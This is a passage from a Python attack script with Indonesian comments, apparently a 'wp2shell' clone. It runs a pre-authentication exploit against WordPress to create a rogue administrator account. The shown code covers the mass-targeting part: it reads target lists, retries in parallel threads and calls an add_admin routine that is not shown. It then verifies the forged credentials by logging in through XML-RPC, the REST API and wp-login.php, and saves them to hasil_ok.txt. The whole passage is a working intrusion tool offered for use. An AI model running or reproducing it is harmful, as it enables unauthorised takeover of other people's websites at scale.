                return ("xmlrpc", False, "auth failed: " + fault_msg[:100])
            print("    [warn] xmlrpc fault (non-auth): %s" % fault_msg[:80], file=sys.stderr, flush=True)
        elif "<methodResponse>" in body and ("isAdmin" in body or "url" in body):
            is_admin = "<boolean>1</boolean>" in body
            return ("xmlrpc", True, "authenticated via XML-RPC, isAdmin=%s" % is_admin)
        else:
            return ("xmlrpc", False, "unexpected xmlrpc response")
    except Exception:
        pass  # xmlrpc gak reachable → lanjut ke metode lain

    # 2. REST Basic Auth (wp/v2/users/me)
    try:
        import base64
        cred = base64.b64encode(("%s:%s" % (username, password)).encode()).decode()
        req = urllib.request.Request(base + "/?rest_route=/wp/v2/users/me",
                                     headers={"Authorization": "Basic " + cred,
                                              "User-Agent": "Mozilla/5.0"})
        resp = session.open(req, timeout=20)
        data = json.loads(resp.read())
        if isinstance(data, dict) and "id" in data:
            return ("rest", True, "user ID=%s name=%s" % (data.get("id"), data.get("name", "")))
        return ("rest", False, str(data)[:100])
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        if "rest_not_logged_in" in body:
            pass  # silent: biarkan fallback ke wp-login tanpa output
        else:
            return ("rest", False, "HTTP %d: %s" % (e.code, body[:80]))
    except Exception:
        pass

    # 3. wp-login.php (form POST)
    try:
        session.open(urllib.request.Request(
            base + "/wp-login.php",
            headers={"User-Agent": "Mozilla/5.0"}), timeout=15).read()
        resp = session.open(urllib.request.Request(
            base + "/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": base + "/wp-admin/",
                "testcookie": "1"}).encode(),
            headers={"User-Agent": "Mozilla/5.0"},
            method="POST"), timeout=30)
        page = resp.read().decode(errors="replace")
        final = resp.geturl()
        if "wp-admin" in final and "wp-login" not in final:
            return ("wp-login", True, "redirected to " + final)
        if "You are now logged in" in page or "logged-in" in page.lower():
            return ("wp-login", True, "session established")
        m = re.search(r'error[0-9a-z_-]*[^<]*|fals[^<]*|incorrect[^<]*|tidak[^<]*',
                      page, re.IGNORECASE)
        if m:
            return ("wp-login", False, "error: " + m.group(0).strip()[:100])
        return ("wp-login", False, "no redirect, no clear success indicator")
    except Exception as e:
        return ("wp-login", False, "exception: %s" % str(e)[:100])

    return ("none", False, "all login methods failed")


def main():
    ap = argparse.ArgumentParser(description="Add admin via PreAuthRCE (wp2shell clone)")
    ap.add_argument("base", nargs="?", default=None, help="Target WordPress base URL")
    ap.add_argument("-f", "--file", default=None,
                    help="File berisi 1 URL per baris (alternatif argumen base)")
    ap.add_argument("--user", default=None, help="Username (default: random w2s_xxx)")
    ap.add_argument("--pass", dest="pword", default=None, help="Password (default: random strong)")
    ap.add_argument("--delay", type=float, default=0.15, help="Oracle unit sleep (default 0.15s)")
    ap.add_argument("--sleep", type=float, default=4.0, help="SLEEP seconds for vuln detect (default 4)")
    ap.add_argument("--route", default="auto", choices=["auto", "wp-json", "rest-route"])
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("-j", "--jobs", type=int, default=10,
                    help="Jumlah thread paralel (default 10)")
    ap.add_argument("--prefix", dest="prefix", default=None,
                    help="Paksa WP prefix (mis. wp_). Skip deteksi kalau diisi")
    ap.add_argument("--oracle-unit", type=float, default=0.35,
                    help="Unit sleep oracle deterministik (default 0.35s)")
    ap.add_argument("--no-dns-precheck", action="store_true",
                    help="Nonaktifkan DNS pre-check (default: AKTIF, murah ~5ms)")
    ap.add_argument("--dns-timeout", type=float, default=5.0,
                    help="Timeout DNS pre-check per target (default 5s)")
    ap.add_argument("--retries", type=int, default=2,
                    help="Jumlah retry untuk error transient (timeout/reset/5xx, default 2)")
    ap.add_argument("--retry-backoff", type=float, default=1.5,
                    help="Backoff detik antar retry (default 1.5s, bertambah per attempt)")
    args = ap.parse_args()

    # Build target list
    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    elif args.base:
        targets = [args.base]
    else:
        ap.error("provide a base URL or -f FILE with targets")

    if args.user and args.pword:
        # If user/pass given explicitly, reuse across all targets
        per_target_creds = True
    else:
        per_target_creds = False

    # Save immediately per target (defined before the loop so it can be called)
    ok_file = "hasil_ok.txt"
    fail_file = "hasil_failed.txt"

    def save_result(base, status, detail):
        if status == "login_ok":
            with log_lock:
                with open(ok_file, "a") as fh:
                    fh.write("%s | %s\n" % (base, detail))
        else:
            with log_lock:
                with open(fail_file, "a") as fh:
                    fh.write("%s | %s | %s\n" % (base, status, detail))

    results = []
    verbose = args.jobs <= 1
    cprint("[*] %d target, %d thread" % (len(targets), args.jobs), C["B"], flush=True)
    cprint("[*] hasil: %s / %s" % (ok_file, fail_file), C["D"], flush=True)
    if args.retries > 0:
        cprint("[*] retry transient error: %d kali, backoff %.1fs" % (args.retries, args.retry_backoff), C["D"], flush=True)

    TRANSIENT_MARKERS = (
        "timed out", "timeout", "connection reset", "temporarily unavailable",
        "connection refused", "errno 111", "errno -3", "errno -2",
        "temporary failure in name resolution", "http 50", "http 502",
        "http 503", "http 504", "ssl", "broken pipe", "connection aborted",
    )

    def is_transient(err):
        low = err.lower()
        return any(m in low for m in TRANSIENT_MARKERS)

    def process(base_raw):
        base = base_raw if "://" in base_raw else "https://" + base_raw
        u, p = (args.user, args.pword) if per_target_creds else (None, None)
        attempt = 0
        while True:
            try:
                out = add_admin(
                    base, username=u, password=p,
                    delay=args.delay, sleep=args.sleep, route=args.route,
                    timeout=args.timeout, proxy=args.proxy, verbose=verbose,
                    force_prefix=args.prefix,
                    oracle_unit=args.oracle_unit,
                    dns_precheck_flag=not args.no_dns_precheck,
                    dns_timeout=args.dns_timeout)
                break  # sukses -> keluar loop
            except Exception as e:
                err = str(e)
                # Retry hanya untuk error transient (timeout/reset/dns-flake),
                # JANGAN retry "not vulnerable" (permanen, percuma diulang)
                if attempt < args.retries and is_transient(err):
                    wait = args.retry_backoff * (attempt + 1)
                    attempt += 1
                    with print_lock:
                        cprint("[retry %d/%d] %s -> %s (wait %.1fs)" %
                               (attempt, args.retries, base, err[:60], wait), C["Y"], flush=True)
                    time.sleep(wait)
                    continue
                # permanen / retries habis -> simpan fail detail, balik
                with print_lock:
                    if "not vulnerable" in err.lower():
                        cprint("[+] %s -> %sNOT VULN%s" % (base, C["R"], C["N"]), flush=True)
                    else:
                        tag = " (transient, retried %dx)" % attempt if attempt else ""
                        cprint("[+] %s -> %sFAILED (%s)%s%s" % (base, C["R"], err, tag, C["N"]), flush=True)
                        save_result(base, "failed", "%s%s" % (err, tag))
                return base, "failed", err

        try:
            username, password, email = out
        except Exception as e:
            err = str(e)
            with print_lock:
                if "not vulnerable" in err.lower():
                    cprint("[+] %s -> %sNOT VULN%s" % (base, C["R"], C["N"]), flush=True)
                else:
                    tag = " (transient, retried %dx)" % attempt if attempt else ""
                    cprint("[+] %s -> %sFAILED (%s)%s%s" % (base, C["R"], err, tag, C["N"]), flush=True)
                    save_result(base, "failed", "%s%s" % (err, tag))
            return base, "failed", err

        # Verify login
        method, ok, detail = try_login(base, username, password)
        cred = "user=%s pass=%s" % (username, password)
        # Distinguish "all verify methods timed out" from real auth failure
        timed_out = ("timed out" in detail.lower() or "timeout" in detail.lower())
        with print_lock:
            if ok:
                cprint("[+] %s -> %sVULN (%s)%s" % (base, C["G"], method, C["N"]), flush=True)
                save_result(base, "login_ok", "%s method=%s" % (cred, method))
                return base, "login_ok", "%s method=%s" % (cred, method)
            else:
                label = "Fail Log (timeout)" if timed_out else "Fail Log"
                cprint("[+] %s -> %sVULN (%s: %s)%s" % (base, C["Y"], label, detail[:60], C["N"]), flush=True)
                save_result(base, "forged_no_verify", "%s method=%s detail=%s" % (cred, method, detail))
                return base, "forged_no_verify", "%s method=%s detail=%s" % (cred, method, detail)

    if args.jobs <= 1:
        for base_raw in targets:
            b, s, d = process(base_raw)
            results.append((b, s, d))
    else:
        with ThreadPoolExecutor(max_workers=args.jobs) as pool:
            futures = {pool.submit(process, b): b for b in targets}
            for fut in as_completed(futures):
                results.append(fut.result())

    # Summary
    n_ok = sum(1 for _, s, _ in results if s == "login_ok")
    n_fail = sum(1 for _, s, _ in results if s == "forged_no_verify")
    n_err = sum(1 for _, s, _ in results if s == "failed")
    cprint("\n" + "=" * 60, C["B"], flush=True)
    cprint("SUMMARY: %d ok, %d fail-log, %d error, %d total" % (n_ok, n_fail, n_err, len(results)), C["B"], flush=True)
    cprint("[+] Hasil tersimpan: %s / %s" % (ok_file, fail_file), C["G"], flush=True)


if __name__ == "__main__":
    main()
